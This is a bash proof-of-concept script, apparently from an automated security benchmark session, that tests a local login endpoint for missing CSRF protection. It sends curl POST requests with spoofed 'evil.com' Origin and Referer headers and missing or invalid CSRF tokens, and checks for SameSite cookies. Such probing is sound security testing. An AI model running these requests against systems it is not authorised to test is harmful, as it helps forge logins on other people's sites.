#!/bin/bash
# POC: Demonstrates missing CSRF token validation on login endpoint by sending cross-origin login requests without CSRF tokens
# Target: ./repo
# Created: 2025-12-01T16:16:22.649Z
# Session: benchmark-XBEN-103-24-mincfo1r

# CSRF Token Validation Missing on Login Endpoint - POC
# This script demonstrates the absence of CSRF protection on the login endpoint

TARGET_URL="${1:-http://localhost:5000}"
LOGIN_ENDPOINT="/login"

echo "=========================================="
echo "CSRF Token Validation POC"
echo "Target: ${TARGET_URL}${LOGIN_ENDPOINT}"
echo "=========================================="
echo ""

# Test 1: Check if CSRF token is required in login response
echo "[*] Test 1: Checking login form for CSRF token requirement..."
FORM_RESPONSE=$(curl -s -i "${TARGET_URL}${LOGIN_ENDPOINT}")
echo "$FORM_RESPONSE" | head -20
echo ""

# Check for CSRF token in response headers
if echo "$FORM_RESPONSE" | grep -qi "csrf"; then
    echo "[+] CSRF token found in response"
else
    echo "[-] No CSRF token found in response headers"
fi
echo ""

# Test 2: Send POST request with cross-origin header (evil.com)
echo "[*] Test 2: Sending login POST request with Origin: http://evil.com..."
CROSS_ORIGIN_RESPONSE=$(curl -s -i -X POST "${TARGET_URL}${LOGIN_ENDPOINT}" \
  -H "Origin: http://evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test")

echo "$CROSS_ORIGIN_RESPONSE" | head -20
HTTP_STATUS=$(echo "$CROSS_ORIGIN_RESPONSE" | head -1 | awk '{print $2}')
echo "HTTP Status: $HTTP_STATUS"

if [ "$HTTP_STATUS" = "403" ] || [ "$HTTP_STATUS" = "400" ]; then
    # Check if rejection is due to CSRF or other reason
    if echo "$CROSS_ORIGIN_RESPONSE" | grep -qi "csrf"; then
        echo "[+] Request rejected due to CSRF validation"
    else
        echo "[-] Request rejected, but NOT due to CSRF (no CSRF error message)"
    fi
else
    echo "[-] Request NOT rejected on cross-origin (Status: $HTTP_STATUS)"
fi
echo ""

# Test 3: Send POST request with mismatched Referer header
echo "[*] Test 3: Sending login POST request with Referer: http://evil.com..."
REFERER_RESPONSE=$(curl -s -i -X POST "${TARGET_URL}${LOGIN_ENDPOINT}" \
  -H "Referer: http://evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test")

echo "$REFERER_RESPONSE" | head -20
echo ""

# Test 4: Send POST without any CSRF token parameter
echo "[*] Test 4: Checking if CSRF token parameter is validated..."
echo "Sending: POST /login with username=test, password=test (no csrf_token)"
NO_CSRF_RESPONSE=$(curl -s -i -X POST "${TARGET_URL}${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test")

echo "$NO_CSRF_RESPONSE" | head -20
HTTP_STATUS_NO_CSRF=$(echo "$NO_CSRF_RESPONSE" | head -1 | awk '{print $2}')
echo "HTTP Status (no CSRF token): $HTTP_STATUS_NO_CSRF"
echo ""

# Test 5: Send POST with invalid CSRF token
echo "[*] Test 5: Checking if invalid CSRF token is validated..."
echo "Sending: POST /login with invalid csrf_token parameter"
INVALID_CSRF_RESPONSE=$(curl -s -i -X POST "${TARGET_URL}${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test&csrf_token=invalid_token_12345")

echo "$INVALID_CSRF_RESPONSE" | head -20
HTTP_STATUS_INVALID=$(echo "$INVALID_CSRF_RESPONSE" | head -1 | awk '{print $2}')
echo "HTTP Status (invalid CSRF): $HTTP_STATUS_INVALID"
echo ""

# Test 6: Check response headers for CSRF protection
echo "[*] Test 6: Checking response headers for CSRF protection..."
HEADERS_RESPONSE=$(curl -s -i -X POST "${TARGET_URL}${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test")

echo "Response Headers:"
echo "$HEADERS_RESPONSE" | head -20
echo ""

# Check for CSRF-related headers
if echo "$HEADERS_RESPONSE" | grep -qi "X-CSRF-Token"; then
    echo "[+] X-CSRF-Token header found in response"
else
    echo "[-] No X-CSRF-Token header in response"
fi

if echo "$HEADERS_RESPONSE" | grep -qi "Set-Cookie.*csrf"; then
    echo "[+] CSRF cookie found in response"
else
    echo "[-] No CSRF cookie in response"
fi

if echo "$HEADERS_RESPONSE" | grep -qi "SameSite"; then
    echo "[+] SameSite cookie attribute found"
else
    echo "[-] No SameSite cookie attribute (allows CSRF)"
fi
echo ""

# Test 7: OPTIONS request to check allowed methods and CSRF headers
echo "[*] Test 7: Sending OPTIONS request to check allowed methods..."
OPTIONS_RESPONSE=$(curl -s -i -X OPTIONS "${TARGET_URL}${LOGIN_ENDPOINT}")
echo "$OPTIONS_RESPONSE" | head -20
echo ""

echo "=========================================="
echo "CSRF Vulnerability Assessment Summary:"
echo "=========================================="
echo "[!] If the endpoint accepts cross-origin requests without CSRF validation,"
echo "    an attacker can forge login requests from malicious websites."
echo "=========================================="